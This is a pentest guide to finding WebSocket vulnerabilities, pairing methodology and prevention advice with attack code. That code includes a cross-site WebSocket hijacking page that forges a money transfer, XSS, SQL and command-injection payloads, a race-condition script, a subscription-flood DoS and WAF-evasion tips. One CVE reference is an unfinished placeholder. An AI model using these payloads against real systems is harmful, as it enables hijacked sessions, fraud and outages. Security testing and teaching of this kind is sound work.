# WebSockets

> Practical, up‑to‑date guide for hunting **WebSocket vulnerabilities** during web pentests, bug bounty programs, and security assessments.  
> Draws from OWASP WebSocket Security Cheat Sheet (latest), PortSwigger Web Security Academy, PayloadsAllTheThings, and 2025–2026 trends (CSWSH, auth bypass in real‑time apps, message injection chaining, unlimited sub DoS, GraphQL‑over‑WS exploits).

WebSockets enable full‑duplex, real‑time communication but introduce unique risks: no built‑in auth/CSRF, persistent connections, and message‑based attacks that bypass traditional HTTP protections.

## Methodology (Based on OWASP & PortSwigger)

**1. Discover WebSocket endpoints**  
- **Protocols:** `ws://` (unencrypted), `wss://` (encrypted)  
- **Common paths:** `/ws`, `/socket`, `/chat`, `/live`, `/updates`, `/notifications`, `/graphql` (GraphQL subscriptions)  
- **Detection:** Scan crawled URLs, browser dev tools (Network → WS), static analysis of JavaScript (`new WebSocket`)

**2. Handshake testing**  
- **Unauthenticated connect:** Open connection without cookies/session → does server accept?  
- **Missing origin validation:** Connect from different origin (`evil.com`) → CSWSH (Cross‑Site WebSocket Hijacking) risk  
- **Missing CSRF‑like protection:** No token in initial message → replay/forge from another tab  
- **WSS enforcement:** Check if `ws://` redirects to `wss://` or is allowed (security misconfiguration)

**3. Message‑level testing**  
- **Injection:** XSS, SQL/NoSQL, command injection in parsed message content (JSON/XML)  
- **Replay attacks:** Capture legitimate message → resend/modify (change user ID, amount)  
- **Race conditions:** Send concurrent messages to exploit TOCTOU in real‑time logic  
- **DoS:** Flood messages/subscriptions, unlimited auth attempts over WebSocket

**4. Advanced bypasses & 2025–2026 trends**  
- CSWSH PoC with malicious page hijacking victim’s WebSocket connection  
- Token smuggling in query params, headers, or first message only  
- Message obfuscation (nested JSON, base64‑encoded payloads, binary frames)  
- GraphQL‑over‑WS: introspection, batching DoS, alias overload via subscriptions  
- Unlimited subscription depth DoS, prototype pollution in Socket.IO

## Tool Installation & Setup

```bash
# wscat – CLI WebSocket client
npm install -g wscat

# Burp Suite – WebSocket history, Repeater, Scanner, Turbo Intruder extension
# Install via BApp Store: "WebSocket Turbo Intruder"

# OWASP ZAP – WebSocket proxy + active scan
# Available in ZAP add‑ons

# mitmproxy – intercept/modify WS traffic
pip3 install mitmproxy

# Custom Node.js scripts for automation
npm install ws
```

## Detection & Enumeration Commands

```bash
# 1. Discover WebSocket endpoints from crawled URLs
cat crawledurls.txt | grep -iE "(socket|ws://|wss://|websocket)" | anew websocket.txt

# 2. Test connection with wscat (interactive)
wscat -c wss://target.com/ws
# Once connected, send messages manually

# 3. Test handshake with curl (HTTP upgrade)
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
  -H "Origin: https://evil.com" \
  "http://target.com/socket"
# Look for "101 Switching Protocols" response

# 4. Browser console test (manual)
# Open browser dev tools, paste:
const ws = new WebSocket('wss://target.com/chat');
ws.onopen = () => ws.send('test payload');
ws.onmessage = (e) => console.log(e.data);

# 5. Automated endpoint discovery with nuclei
nuclei -t ~/nuclei-templates/websockets/ -list targets.txt
```

## Exploitation Commands by Vulnerability

### Unauthenticated Connect & Origin Bypass
```bash
# Try connecting without authentication cookies
wscat -c wss://target.com/ws --no-cookies

# Spoof Origin header (if validation weak)
wscat -c wss://target.com/ws --header "Origin: https://trusted-domain.com"

# Use Burp Repeater to modify handshake headers (Origin, Sec-WebSocket-Key, cookies)
```

### Cross‑Site WebSocket Hijacking (CSWSH) PoC
Create malicious HTML page (`cs.html`):
```html
<script>
  var ws = new WebSocket('wss://target.com/ws');
  ws.onopen = () => {
    ws.send('{"action":"transfer","to":"attacker","amount":1000}');
    console.log('Hijacked WebSocket – sent malicious message');
  };
</script>
```
Host on attacker server; victim visits → uses victim’s cookies to authenticate WebSocket.

### Message Injection (XSS, SQL, NoSQL)
```bash
# XSS payload via wscat
echo '<script>alert(1)</script>' | wscat -c wss://target.com/chat

# JSON injection (if messages parsed as JSON)
wscat -c wss://target.com/ws
> {"msg": "<img src=x onerror=alert(1)>", "user": "admin"}

# SQL/NoSQL injection attempts
wscat -c wss://target.com/ws
> {"query": "' OR 1=1 --", "action": "search"}

# Command injection (if server executes commands from messages)
wscat -c wss://target.com/ws
> {"cmd": "ls -la", "id": "123"}
```

### Replay & Race Attacks
```bash
# Capture legitimate WebSocket message (via Burp)
# Replay multiple times with wscat or Burp Repeater

# Race condition: send concurrent messages (Turbo Intruder script)
# Use Turbo Intruder WebSocket extension with concurrent engine
# Example script:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           engine=Engine.WEBSOCKET,
                           )
    for i in range(30):
        engine.queue(target.req)
```

### DoS via Unlimited Subscriptions
```bash
# GraphQL‑over‑WS subscription DoS
wscat -c wss://target.com/graphql
> {"type":"start","id":"1","payload":{"query":"subscription { infiniteEvents { id } }"}}
# Repeat with many subscriptions (different IDs) to overwhelm server
```

## Advanced Techniques & Bypasses (2025‑2026 Trends)

**1. CSWSH with token smuggling** – If token passed in query param (`wss://target.com/ws?token=xxx`), attacker can embed token in malicious page (if token not bound to origin).

**2. Message obfuscation** – Encode payloads in base64, nested JSON, or binary frames to bypass WAFs.

**3. GraphQL‑over‑WS exploits** – Introspection via WebSocket (send `{"type":"start","id":"1","payload":{"query":"{ __schema { ... } }"}}`), batching DoS, alias overload.

**4. Prototype pollution in Socket.IO** – Send malicious objects that pollute server‑side prototypes (CVE‑2023‑...).

**5. Session tying & re‑auth flaws** – Close WebSocket on logout? If not, old connection may still be usable. Test re‑auth on reconnect.

**6. Rate‑limit bypass** – WebSocket connections may not be subject to HTTP rate limits; flood messages/subscriptions.

**7. Chained attacks** – WebSocket injection → XSS → steal HTTP session; WebSocket → internal data leak → pivot to HTTP vulnerabilities.

## Detection & Verification

- **Connection without auth/Origin** → vulnerable
- **Payload reflected/executed in other clients** (XSS)
- **Actions performed without consent** (transfer, delete, modify)
- **Replay succeeds** → no nonce/timestamp validation
- **Blind exploitation** – OAST exfiltration via messages, observable side‑effects (e.g., chat message appears)

## Prevention Guidance (Developer‑Focused)

1. **Always use WSS (TLS)** – Enforce redirect from `ws://` to `wss://`, implement HSTS.
2. **Validate Origin during handshake** – Strict allow‑list of permitted origins.
3. **Authenticate every connection** – Token in query/header/first message, validate session.
4. **Authorize actions** – Check per‑channel/per‑message permissions.
5. **Input validation / sanitization** – Parse messages safely, escape outputs.
6. **CSRF‑like tokens or nonces** for sensitive messages.
7. **Rate limit connects, messages, subscriptions**.
8. **Close WebSocket on logout / session expiry** – Invalidate connection server‑side.

## References

- [PortSwigger Testing WebSockets](https://portswigger.net/web-security/websockets)
- [OWASP WebSocket Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html)
- [PayloadsAllTheThings – WebSockets](https://github.com/swisskyrepo/PayloadsAllTheThings) (search WebSocket section)
- Recent: 2025–2026 bounties on WS auth bypass (InfoSec Write‑ups), CSWSH chains, GraphQL sub DoS
- **Checklist:** [Web‑Vulnerability‑Testing‑Checklist/WebSockets.md](../Web‑Vulnerability‑Testing‑Checklist/WebSockets.md)
